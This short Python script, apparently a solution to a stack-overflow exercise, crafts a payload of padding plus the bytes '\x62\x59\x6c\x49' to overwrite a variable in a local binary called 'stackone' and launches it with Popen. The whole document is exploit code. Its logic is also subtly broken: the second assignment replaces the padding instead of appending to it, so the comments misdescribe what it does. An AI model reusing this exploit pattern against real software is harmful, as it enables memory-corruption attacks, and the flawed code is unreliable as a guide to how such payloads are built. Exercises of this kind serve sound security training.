# Author: Matthew McKeever
# Date: 08/08/2021

#!/usr/bin/env python3

from subprocess import Popen

# Determine buffer/pad length
pad_length = int(0x58-0x18)

# Craft payload
payload = 'A' * pad_length
payload = '\x62\x59\x6c\x49' # Value we want to overwrite targetted variable with

# Execute exploit with Popen
p = Popen(['./stackone', payload])
